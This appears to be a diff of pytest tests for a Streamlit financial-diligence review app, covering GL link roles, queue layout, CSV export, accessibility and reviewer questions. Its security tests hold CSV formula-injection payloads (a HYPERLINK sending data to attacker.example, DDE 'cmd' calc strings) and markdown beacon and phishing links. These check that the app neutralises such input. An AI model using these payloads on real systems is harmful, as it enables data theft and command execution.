+
+# -- ui-11 / ui-12: GL link roles ---------------------------------------------------------
+
+
+def _roles_assessment() -> AdjustmentAssessment:
+    links = [
+        GLLink(entry_id="GL-R10", period="2025-02", amount="5000.00", score=3.0, role="supporting", claimed=True),
+        GLLink(entry_id="GL-R11", period="2025-03", amount="7000.00", score=3.0, role="removed", claimed=True,
+               removed_by=FlagCode.CONTRADICTORY_EVIDENCE, supports_claim=False),
+        GLLink(entry_id="GL-R12", period="2025-04", amount="3000.00", score=3.0, role="moved", claimed=True),
+        GLLink(entry_id="GL-R13", period="2025-05", amount="-2000.00", score=2.0, role="recovery", supports_claim=False),
+        GLLink(entry_id="GL-R3", period="2024-03", amount="6000.00", score=2.0, role="context", supports_claim=False),
+    ]
+    return _assessment("A-9", Treatment.REVISE, _pm("0", "15000"), _pm("0", "6000"), traced_gl=_pm("0", "15000"), gl_links=links)
+
+
+def test_gl_link_rows_label_claimed_removed_moved_recovery_and_context():
+    a = _roles_assessment()
+    rows = ui.gl_link_rows(a, {})
+    assert [(r["GL row"], r["Role"]) for r in rows] == [
+        (10, "Supporting (claimed, carried)"),
+        (12, "Claimed, carried in another period"),
+        (11, "Claimed, removed by Contradictory evidence"),
+        (13, "Recovery (offsets the claim)"),
+        (3, "Context (not part of the claim)"),
+    ]
+    assert list(ui.gl_role_counts(a).values()) == [1, 1, 1, 1, 1]
+    periods = [PeriodDef(label="FY2024", start="2024-01", end="2024-12"), PeriodDef(label="FY2025", start="2025-01", end="2025-12")]
+    tie = {r["Line"]: r for r in ui.claimed_link_tieout(a, periods)}
+    assert tie["Claimed entries listed (by GL month)"]["FY2025"] == "15,000"  # ties to Traced to GL
+    assert tie["of which still carried"]["FY2025"] == "8,000"
+    assert tie["Traced to GL (tie-out)"]["FY2025"] == "15,000" and tie["Difference"]["FY2025"] == "-"
+    assert tie["Claimed entries listed (by GL month)"]["FY2024"] == "-"  # the comparable is context, not claimed
+
+
+def test_gl_link_roles_fall_back_for_older_workpapers():
+    removed = GLLink(entry_id="GL-R5", period="2025-01", amount="1.00", score=1.0, supports_claim=False,
+                     reasons=["account", "Removed (CONTINUING_OBLIGATION): retainer continues"])
+    context = GLLink(entry_id="GL-R6", period="2024-01", amount="1.00", score=1.0, supports_claim=False, reasons=["Context only: no claim"])
+    supporting = GLLink(entry_id="GL-R7", period="2025-01", amount="1.00", score=1.0)
+    assert ui.link_role(removed) == ("removed", FlagCode.CONTINUING_OBLIGATION)
+    assert ui.link_role(context) == ("context", None) and ui.link_role(supporting) == ("supporting", None)
+    assert ui.link_is_claimed(removed) and not ui.link_is_claimed(context)
+
+
+def test_queue_gl_link_counts_match_the_workbook_columns():
+    wp = _workpaper()
+    wp.assessments.append(_roles_assessment())
+    all_removed = _assessment("A-6", Treatment.REJECT, _pm("0", "96"), _pm("0", "0"), gl_links=[
+        GLLink(entry_id=f"GL-R{i}", period="2025-01", amount="8.00", score=1.0, role="removed", claimed=True,
+               removed_by=FlagCode.RECURRING_PATTERN, supports_claim=False) for i in range(20, 32)])
+    wp.assessments.append(all_removed)
+    rows = {r["Ref"]: r for r in ui.queue_rows(wp, {}, final_amounts(wp, {}))}
+    assert (rows["A-9"]["GL links"], rows["A-9"]["Supporting GL links"]) == (5, 2)
+    assert (rows["A-6"]["GL links"], rows["A-6"]["Supporting GL links"]) == (12, 0)
+
+
+# -- ui-13: grids show their rows; compact queue; row click opens -------------------------
+
+
+def test_queue_grid_is_compact_and_sized_to_its_rows():
+    compact = ui.queue_columns(LABELS, all_columns=False)
+    assert compact == ["Ref", "Title", "Tool", "Reviewer", "Status", "Bridge", "Final FY2024", "Final FY2025", "Top flags", "Open Qs"]
+    assert set(compact) < set(ui.queue_columns(LABELS))
+    assert ui.table_height(14, None) == "content" and ui.table_height(300, None) == "content"
+    assert ui.table_height(22) == "content" and ui.table_height(60, 25) == 35 * 26 + 3
+    assert ui.selected_ref(["A-1", "A-2"], {"selection": {"rows": [1], "columns": []}}) == "A-2"
+    assert ui.selected_ref(["A-1"], {"selection": {"rows": []}}) is None
+    assert ui.selected_ref(["A-1"], None) is None and ui.selected_ref(["A-1"], {"selection": {"rows": [5]}}) is None
+
+
+def test_app_queue_rows_are_selectable_and_questions_show_every_row(wp, tmp_path, monkeypatch):
+    at, _ = _app(wp, tmp_path, monkeypatch, page="Adjustment queue")
+    assert [list(df.proto.selection_mode) for df in at.dataframe] == [[0]]  # single-row selection
+    many = wp.model_copy(deep=True)
+    a4 = _by_id(many)["A-4"]
+    a4.open_questions = [OpenQuestion(q_id=f"Q-A-4-{i}", adj_id="A-4", text=f"Question number {i}") for i in range(1, 23)]
+    at, _ = _app(many, tmp_path / "many", monkeypatch, page="Open questions")
+    table = " ".join(str(h.proto) for h in at.get("html"))
+    assert all(f"Q-A-4-{i}<" in table for i in range(1, 23))
+
+
+# -- ui-14 / security-csv-formula-injection: the information request list -----------------
+
+
+def test_request_list_exports_exactly_the_filtered_rows_without_internal_codes(wp):
+    rows = ui.question_rows(wp)
+    assert ui.filter_question_rows(rows, priorities=["low"]) == []
+    assert ui.request_list_csv([]).decode().strip() == ",".join(ui.REQUEST_LIST_COLUMNS)
+    shown = ui.filter_question_rows(rows, statuses=["OPEN"], priorities=["high"])
+    assert [r["Q id"] for r in shown] == ["Q-A-4-1"]
+    text = ui.request_list_csv(shown).decode()
+    assert "Basis" not in text.splitlines()[0] and len(text.strip().splitlines()) == 2
+
+
+def test_request_list_csv_neutralizes_formula_cells():
+    payloads = [
+        '=HYPERLINK("http://attacker.example/leak?"&A2,"Open data request")',
+        "+cmd|' /C calc'!A0",
+        "-2+3+cmd|' /C calc'!A0",
+        "@SUM(1+1)*cmd|' /C calc'!A0",
+        "\t=1+1",
+        "\r=1+1",
+        "  =1+1",
+        "＝HYPERLINK(1)",
+    ]
+    rows = [{"Q id": "Q-1", "Ref": p, "Question": p, "Priority": "high", "Status": "OPEN", "Response": p} for p in payloads]
+    import csv as _csv
+
+    parsed = list(_csv.reader(io.StringIO(ui.request_list_csv(rows).decode())))
+    for rec in parsed[1:]:
+        for cell in (rec[1], rec[2], rec[5]):
+            assert cell.startswith("'"), cell
+    assert ui.csv_safe("Provide the executed agreement.") == "Provide the executed agreement."
+    assert ui.csv_safe(12) == 12
+
+
+def test_app_empty_filter_disables_the_csv_download(wp, tmp_path, monkeypatch):
+    at, _ = _app(wp, tmp_path, monkeypatch, page="Open questions")
+    at.multiselect(key="oq_f_prio").set_value(["low"]).run()
+    [dl] = [d for d in at.get("download_button") if "CSV" in d.proto.label]
+    assert dl.proto.disabled
+    assert "No questions match the filters." in _texts(at.caption)
+    assert not any(b.label == "Record update" for b in at.button)
+
+
+# -- ui-17: accessible colours ------------------------------------------------------------
+
+
+def _contrast(fg: str, bg: str) -> float:
+    def lum(h: str) -> float:
+        r, g, b = (int(h.lstrip("#")[i : i + 2], 16) / 255 for i in (0, 2, 4))
+        f = lambda c: c / 12.92 if c <= 0.03928 else ((c + 0.055) / 1.055) ** 2.4  # noqa: E731
+        return 0.2126 * f(r) + 0.7152 * f(g) + 0.0722 * f(b)
+
+    hi, lo = sorted((lum(fg), lum(bg)), reverse=True)
+    return (hi + 0.05) / (lo + 0.05)
+
+
+def test_theme_and_css_meet_contrast_minimums():
+    import tomllib
+
+    config = tomllib.loads((ROOT / ".streamlit" / "config.toml").read_text())
+    primary = config["theme"]["primaryColor"]
+    assert primary == ui.PRIMARY_COLOR
+    assert _contrast("#FFFFFF", primary) >= 4.5  # button text
+    assert _contrast(primary, "#FFFFFF") >= 3 and _contrast(primary, "#0E1117") >= 3  # control vs light/dark page
+    assert "#1F3864" not in ui._CSS  # the diligence heading row inherits the theme's text colour
+    assert 'data-testid="stCaptionContainer"' in ui._CSS and "color:inherit" in ui._CSS
+
+
+def test_app_pre_submit_problems_are_shown_as_warnings(wp, tmp_path, monkeypatch):
+    at, _ = _app(wp, tmp_path, monkeypatch, page="Adjustment detail", adj="A-2")
+    assert any(t.startswith("Needed before recording: Enter the reviewer's name.") for t in _texts(at.warning))
+    assert not any("Before recording" in t for t in _texts(at.caption))
+
+
+# -- ui-18: bridge label -------------------------------------------------------------------
+
+
+def test_bridge_status_says_how_the_item_is_carried():
+    assert ui.bridge_status({}) == "Excluded (pending)"
+    assert ui.bridge_status(_pm("0", "0")) == "Carried at 0"
+    assert ui.bridge_status(_pm("0", "-40")) == "Carried"
+
+
+# -- ui-19: holdout is opt-in --------------------------------------------------------------
+
+
+def test_holdout_is_hidden_unless_opted_in(tmp_path, monkeypatch):
+    monkeypatch.delenv(ui.SHOW_HOLDOUT_ENV, raising=False)
+    for split, name in (("dev", "alpha"), ("holdout", "beta")):
+        (tmp_path / split / name).mkdir(parents=True)
+        (tmp_path / split / name / "deal.yaml").write_text(f"deal_id: {name}\ntarget_name: {name}\n")
+    assert [d.deal_id for d in ui.discover_deals(tmp_path)] == ["alpha"]
+    assert ui.find_deal_dir("beta", tmp_path) is None
+    assert ui.is_holdout_path(tmp_path / "holdout" / "beta", tmp_path)
+    assert not ui.is_holdout_path(tmp_path / "dev" / "alpha", tmp_path)
+    monkeypatch.setenv(ui.SHOW_HOLDOUT_ENV, "1")
+    assert [d.deal_id for d in ui.discover_deals(tmp_path)] == ["alpha", "beta"]
+
+
+def test_app_refuses_a_holdout_path_without_the_opt_in(tmp_path, monkeypatch):
+    testing = pytest.importorskip("streamlit.testing.v1")
+    monkeypatch.delenv(ui.SHOW_HOLDOUT_ENV, raising=False)
+    holdout = tmp_path / "data" / "holdout" / "beta"
+    holdout.mkdir(parents=True)
+    (holdout / "deal.yaml").write_text("deal_id: beta\ntarget_name: Secret Target\n")
+    monkeypatch.setenv("QOE_DATA_DIR", str(tmp_path / "data"))
+    monkeypatch.setenv("QOE_WORKPAPERS_DIR", str(tmp_path / "wp"))
+    at = testing.AppTest.from_file(str(ROOT / "qoe" / "ui.py"), default_timeout=60)
+    at.run()
+    assert not at.sidebar.selectbox  # nothing listed in the Library
+    at.sidebar.radio(key="deal_source").set_value("Path").run()
+    at.sidebar.text_input(key="deal_path").input(str(holdout)).run()
+    assert any("Held-out deal packages are hidden" in _plain(w.value) for w in at.sidebar.warning)
+    assert not any(b.label == "Run review" for b in at.sidebar.button)
+    assert "Secret Target" not in " ".join(str(e.value) for e in at.sidebar.caption)
+
+
+# -- security-ui-markdown-injection ---------------------------------------------------------
+
+
+def test_md_escapes_markdown_links_images_directives_and_math():
+    hostile = "M-04 ![](https://attacker.example/b.png?who=r) [View](https://phish.example/login) :red[x] $x$ **b**"
+    out = ui.md(hostile)
+    assert "![](" not in out and "](" not in out and "$x$" not in out and ":red[" not in out and "**" not in out
+    assert _plain(out) == hostile
+    assert ui.md("a\n# heading") == "a \\# heading"
+
+
+def test_app_seller_ref_is_rendered_inert(tmp_path, monkeypatch):
+    hostile = "M-04 ![](https://attacker.example/beacon.png) [View agreement](https://phish.example/login)"
+    wp = _workpaper()
+    wp.assessments[0] = wp.assessments[0].model_copy(update={"adj_id": hostile})
+    at, _ = _app(wp, tmp_path, monkeypatch, page="Adjustment detail", adj=hostile)
+    at.text_input(key="reviewer").input("Ann")
+    at.run()
+    _click(at, "Record decision")
+    bodies = [m.value for m in at.success]
+    assert bodies and all("](" not in b for b in bodies)
+    assert any(hostile in _plain(b) for b in bodies)
+
+
+# -- security-ui-unauthenticated-network ----------------------------------------------------
+
+
+def test_ui_binds_to_localhost_by_default():
+    import tomllib
+
+    makefile = (ROOT / "Makefile").read_text()
+    ui_target = makefile.split("\nui:\n", 1)[1].split("\n\n", 1)[0]
+    assert "--server.address 127.0.0.1" in ui_target
+    config = tomllib.loads((ROOT / ".streamlit" / "config.toml").read_text())
+    assert config["server"]["address"] == "127.0.0.1"
+
+
+# -- excel-pending-without-question: Request info needs an open question -------------------
+
+
+def test_request_info_requires_an_open_question(wp):
+    a = _by_id(wp)
+    kw = dict(amounts={}, rationale="Need support.", reviewer="Ann", labels=LABELS, correction_type=CorrectionType.JUDGMENT_DIFFERENCE)
+    errors, _ = decision_problems(a["A-1"], treatment=Treatment.REQUEST_INFO, **kw)
+    assert any("add a question for management" in e for e in errors)
+    errors, _ = decision_problems(a["A-1"], treatment=Treatment.REQUEST_INFO,
+                                  questions=questions_after(a["A-1"].open_questions, new_texts=["Provide the invoice."]), **kw)
+    assert errors == []
+    # Closing every open question in the same form leaves nothing asked.
+    closed = questions_after(a["A-4"].open_questions, {"Q-A-4-1": "CLOSED", "Q-A-4-2": "ANSWERED: yes"})
+    errors, _ = decision_problems(a["A-4"], treatment=Treatment.REQUEST_INFO, questions=closed, **kw)
+    assert any("add a question for management" in e for e in errors)
+    errors, _ = decision_problems(a["A-4"], treatment=Treatment.REQUEST_INFO, **kw)
+    assert not any("question" in e for e in errors)
+
+
+def test_reviewer_raised_questions_join_the_workpaper(wp, tmp_path):
+    store = ReviewStore(tmp_path / "review_log.jsonl")
+    with pytest.raises(DecisionError):
+        store.add_question(adj_id="A-1", text="  ", reviewer="Ann")
+    first = store.add_question(adj_id="A-1", text="Provide  the\ninvoice.", reviewer=" Ann ", priority="high", timestamp=TS)
+    second = store.add_question(adj_id="A-1", text="Who approved it?", reviewer="Ann", priority="bogus")
+    assert (first.q_id, first.text, first.reviewer, second.q_id, second.priority) == (
+        "Q-A-1-R1", "Provide the invoice.", "Ann", "Q-A-1-R2", "medium")
+    out = apply_reviews(wp, [], question_log=store.questions())
+    qs = _by_id(out)["A-1"].open_questions
+    assert [(q.q_id, q.status, q.basis) for q in qs] == [
+        ("Q-A-1-R1", QuestionStatus.OPEN, "Raised by reviewer Ann"), ("Q-A-1-R2", QuestionStatus.OPEN, "Raised by reviewer Ann")]
+    again = apply_reviews(out, [], question_log=store.questions())  # re-applying adds nothing twice
+    assert [q.q_id for q in _by_id(again)["A-1"].open_questions] == ["Q-A-1-R1", "Q-A-1-R2"]
+    assert ui.status_counts(out, {}, final_amounts(out, {}))["pending_without_question"] == []
+    # A pending item with nothing asked is surfaced.
+    info = _decision("A-3", Treatment.REQUEST_INFO, {}, Treatment.REJECT, _pm("0", "0"))
+    assert ui.status_counts(wp, {"A-3": info}, final_amounts(wp, {"A-3": info}))["pending_without_question"] == ["A-3"]
+
+
+def test_app_request_info_records_the_new_question_with_the_decision(wp, tmp_path, monkeypatch):
+    at, wdir = _app(wp, tmp_path, monkeypatch, page="Adjustment detail", adj="A-1")
+    at.text_input(key="reviewer").input("Ann")
+    at.radio(key="f:A-1:treatment").set_value(Treatment.REQUEST_INFO)
+    at.text_area(key="f:A-1:rationale").input("Invoice needed before accepting.")
+    at.selectbox(key="f:A-1:correction").set_value(CorrectionType.NEW_INFORMATION)
+    at.run()
+    _click(at, "Record decision")
+    store = ReviewStore.for_workpaper_dir(wdir)
+    assert store.all() == []
+    assert any("add a question for management" in t for t in _texts(at.error))
+    at.text_area(key="f:A-1:newq").input("Please provide the vendor invoice.")
+    at.run()
+    _click(at, "Record decision")
+    [d] = store.all()
+    [q] = store.questions()
+    assert (d.treatment, d.question_updates) == (Treatment.REQUEST_INFO, {})
+    assert (q.kind, q.q_id, q.reviewer, q.priority, q.timestamp) == ("new", "Q-A-1-R1", "Ann", "high", d.timestamp)
+    at.session_state["page"] = "Open questions"
+    at.run()
+    assert "Q-A-1-R1" in " ".join(str(h.proto) for h in at.get("html"))
+
+
+def test_review_form_question_edits_go_to_the_question_log(wp, tmp_path, monkeypatch):
+    at, wdir = _app(wp, tmp_path, monkeypatch, page="Adjustment detail", adj="A-4")
+    at.text_input(key="reviewer").input("Ann")
+    at.selectbox(key="f:A-4:q:Q-A-4-2:status").set_value(QuestionStatus.CLOSED)
+    at.run()
+    _click(at, "Record decision")
+    store = ReviewStore.for_workpaper_dir(wdir)
+    [d] = store.all()
+    assert (d.treatment, d.question_updates) == (Treatment.REQUEST_INFO, {})
+    assert [(e.q_id, e.status, e.reviewer, e.timestamp) for e in store.questions()] == [
+        ("Q-A-4-2", QuestionStatus.CLOSED, "Ann", d.timestamp)]
+    # A question answered elsewhere after the form was opened is not reverted by recording the form.
+    at.session_state["adj_select"] = "A-4"
+    at.run()
+    q1 = _by_id(wp)["A-4"].open_questions[0]
+    store.append_question(make_question_update(q1, adj_id="A-4", status=QuestionStatus.ANSWERED, response="Sent", reviewer="Bob"))
+    at.run()
+    at.text_area(key="f:A-4:rationale").input("Still pending.")
+    at.run()
+    _click(at, "Record decision")
+    assert [e.reviewer for e in store.questions()] == ["Ann", "Bob"]
